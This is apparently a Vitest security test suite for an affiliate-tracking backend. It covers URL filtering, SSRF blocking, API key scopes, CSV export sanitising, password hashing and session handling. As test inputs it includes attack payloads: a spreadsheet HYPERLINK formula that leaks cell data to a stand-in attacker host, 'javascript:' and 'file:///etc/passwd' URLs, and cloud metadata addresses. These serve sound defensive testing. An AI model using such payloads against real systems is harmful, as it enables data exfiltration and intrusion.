import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { eq } from "drizzle-orm";
import type { Db } from "../src/db/client";
import { closeDb, createActiveAffiliate, createWorkspace, getDb, makeClock, type Workspace } from "./helpers";
import { tenantContext, can, API_KEY_SCOPES } from "../src/context";
import { assertPublicUrl, httpUrl, isPublicIp, urlLooksPublic } from "../src/urls";
import { toCsv } from "../src/services/exports";
import * as auth from "../src/services/auth";
import * as affiliates from "../src/services/affiliates";
import * as commissions from "../src/services/commissions";
import * as webhooks from "../src/services/webhooks";
import { affiliatePrograms, users, type Affiliate } from "../src/db/schema";

let db: Db;
const clock = makeClock();
let ws: Workspace;

beforeAll(async () => {
  db = await getDb();
  ws = await createWorkspace(db, clock, { programOverrides: { approvalMode: "auto" } });
});
afterAll(closeDb);

describe("security guards", () => {
  it("http(s)-only URLs: javascript:, data: and file: are refused wherever a link is stored", () => {
    expect(httpUrl.safeParse("https://example.com/x").success).toBe(true);
    expect(httpUrl.safeParse("http://example.com").success).toBe(true);
    for (const bad of ["javascript:alert(1)", "data:text/html,hi", "file:///etc/passwd", "ftp://example.com", "not a url"]) expect(httpUrl.safeParse(bad).success).toBe(false);
  });

  it("SSRF guard: private, loopback, link-local and metadata addresses are never public", async () => {
    for (const ip of ["127.0.0.1", "10.1.2.3", "172.16.0.1", "172.31.255.255", "192.168.1.1", "169.254.169.254", "0.0.0.0", "100.64.0.1", "224.0.0.1", "::1", "fc00::1", "fe80::1", "::ffff:10.0.0.1"]) expect(isPublicIp(ip)).toBe(false);
    for (const ip of ["93.184.216.34", "8.8.8.8", "172.32.0.1", "2606:4700::1111"]) expect(isPublicIp(ip)).toBe(true);
    expect(urlLooksPublic("http://localhost:4000/admin").ok).toBe(false);
    expect(urlLooksPublic("http://169.254.169.254/latest/meta-data/").ok).toBe(false);
    expect(urlLooksPublic("http://[::1]/").ok).toBe(false);
    expect(urlLooksPublic("http://user:pass@example.com/").ok).toBe(false);
    expect(urlLooksPublic("http://db.internal/").ok).toBe(false);
    expect(urlLooksPublic("https://hooks.zapier.com/x").ok).toBe(true);
    // a public name that resolves (or rebinds) to a private address is refused at send time
    await expect(assertPublicUrl("https://evil.example.com/", async () => [{ address: "93.184.216.34" }, { address: "10.0.0.5" }])).rejects.toThrow(/private/);
    await expect(assertPublicUrl("https://gone.example.com/", async () => [])).rejects.toThrow(/resolve/);
    await expect(assertPublicUrl("https://ok.example.com/", async () => [{ address: "93.184.216.34" }])).resolves.toBeUndefined();
    await expect(webhooks.createSubscription(db, ws.ctx, { url: "http://192.168.0.10/hook", events: ["*"] })).rejects.toThrow(/public/);
  });

  it("API keys get exactly their scopes; workspace, billing, team and integration management are never scopeable", () => {
    const key = (scopes: string[]) => tenantContext(ws.tenant.id, { type: "api_key", id: "key_1", scopes }, clock.now);
    expect(can(key(["read"]), "read")).toBe(true);
    expect(can(key(["read"]), "conversions.write")).toBe(false);
    expect(can(key(["conversions.write"]), "conversions.write")).toBe(true);
    expect(can(key(["integrations.manage"]), "integrations.manage")).toBe(false);
    expect(can(key(["team.manage"]), "team.manage")).toBe(false);
    expect(can(key([]), "read")).toBe(false);
    expect(API_KEY_SCOPES).not.toContain("integrations.manage");
    expect(API_KEY_SCOPES).toContain("payouts.write");
  });

  it("CSV export neutralises spreadsheet formulas in user-controlled cells", () => {
    const csv = toCsv([{ name: '=HYPERLINK("https://evil.example/?"&B2,"open")', company: "+1234", note: "-x", handle: "@me", plain: "fine" }]);
    const [, row] = csv.trim().split("\n");
    expect(row).toBe(`"'=HYPERLINK(""https://evil.example/?""&B2,""open"")",'+1234,'-x,'@me,fine`);
  });

  it("passwords: legacy hashes still verify and are upgraded; a miss costs a real comparison", async () => {
    const fresh = await auth.hashPassword("correct horse battery");
    expect(fresh.split("$")).toHaveLength(4);
    expect(await auth.verifyPassword("correct horse battery", fresh)).toBe(true);
    expect(await auth.verifyPassword("wrong", fresh)).toBe(false);
    expect(auth.passwordNeedsRehash(fresh)).toBe(false);
    // a hash in the pre-cost-parameter format (scrypt N=16384)
    const { scryptSync } = await import("node:crypto");
    const salt = Buffer.from("0123456789abcdef");
    const legacy = `scrypt$${salt.toString("base64")}$${scryptSync("oldpass123", salt, 64).toString("base64")}`;
    expect(await auth.verifyPassword("oldpass123", legacy)).toBe(true);
    expect(auth.passwordNeedsRehash(legacy)).toBe(true);
    const t0 = Date.now();
    expect(await auth.verifyPassword("anything", null)).toBe(false);
    expect(Date.now() - t0).toBeGreaterThan(5); // not the instant "no user" fast path
  });

  it("public application with a known email requires that account's password and never demotes a membership", async () => {
    const applied = await affiliates.applyToProgram(db, ws.ctx, ws.program.id, { name: "Zoe", email: "zoe@example.com", password: "zoepassword1", acceptTerms: true });
    expect(applied.authenticated).toBe(true);
    expect(applied.affiliate.status).toBe("active");
    await expect(affiliates.applyToProgram(db, ws.ctx, ws.program.id, { name: "Mallory", email: "ZOE@example.com", password: "guesswrong1", acceptTerms: true })).rejects.toThrow(/already exists/);
    const again = await affiliates.applyToProgram(db, ws.ctx, ws.program.id, { name: "Zoe", email: "zoe@example.com", password: "zoepassword1", acceptTerms: true });
    expect(again.authenticated).toBe(true);
    expect(again.affiliate.id).toBe(applied.affiliate.id);
    // an affiliate created by the merchant (no password yet) cannot be claimed through the public form
    const manual = await createActiveAffiliate(db, ws, "Manual");
    await expect(affiliates.applyToProgram(db, ws.ctx, ws.program.id, { name: "x", email: manual.email, password: "whatever1", acceptTerms: true })).rejects.toThrow(/already exists/);
    // a re-application against a manual-approval program keeps an active membership active
    const manualWs = await createWorkspace(db, clock, { programOverrides: { approvalMode: "manual" } });
    const first = await affiliates.applyToProgram(db, manualWs.ctx, manualWs.program.id, { name: "Yan", email: "yan@example.com", password: "yanpassword1", acceptTerms: true });
    await db.update(affiliatePrograms).set({ status: "active" }).where(eq(affiliatePrograms.affiliateId, first.affiliate.id));
    await db.update(users).set({ status: "active" }).where(eq(users.id, first.affiliate.userId!));
    await affiliates.approveAffiliate(db, manualWs.ctx, first.affiliate.id);
    const re = await affiliates.applyToProgram(db, manualWs.ctx, manualWs.program.id, { name: "Yan", email: "yan@example.com", password: "yanpassword1", acceptTerms: true });
    expect(re.membership.status).toBe("active");
  });

  it("commission reversal and settlement need commissions.write; balance adjustments need an affiliate of this tenant", async () => {
    const readonly = tenantContext(ws.tenant.id, { type: "user", id: "usr_ro", role: "readonly" }, clock.now);
    await expect(commissions.reverseCommission(db, readonly, "com_x", "because")).rejects.toThrow(/commissions.write/);
    await expect(commissions.settleHoldingPeriods(db, readonly)).rejects.toThrow(/commissions.write/);
    await expect(commissions.adjustAffiliateBalance(db, ws.ctx, { affiliateId: "aff_not_here", amountMinor: 100, currency: "USD", reason: "x" })).rejects.toThrow(/affiliate/);
  });

  it("changePassword verifies the current password and drops every other session", async () => {
    const zoe = (await db.query.users.findFirst({ where: eq(users.email, "zoe@example.com") }))!;
    const keep = await auth.createSession(db, zoe, clock.now());
    const other = await auth.createSession(db, zoe, clock.now());
    await expect(auth.changePassword(db, zoe.id, { currentPassword: "nope", newPassword: "zoepassword2", keepSessionToken: keep.token }, clock.now())).rejects.toThrow(/current password/);
    await auth.changePassword(db, zoe.id, { currentPassword: "zoepassword1", newPassword: "zoepassword2", keepSessionToken: keep.token }, clock.now());
    expect(await auth.resolveSession(db, keep.token, clock.now())).not.toBeNull();
    expect(await auth.resolveSession(db, other.token, clock.now())).toBeNull();
    expect(await auth.verifyPassword("zoepassword2", (await db.query.users.findFirst({ where: eq(users.id, zoe.id) }))!.passwordHash)).toBe(true);
  });
});

// keep the unused-type check honest
export type _A = Affiliate;
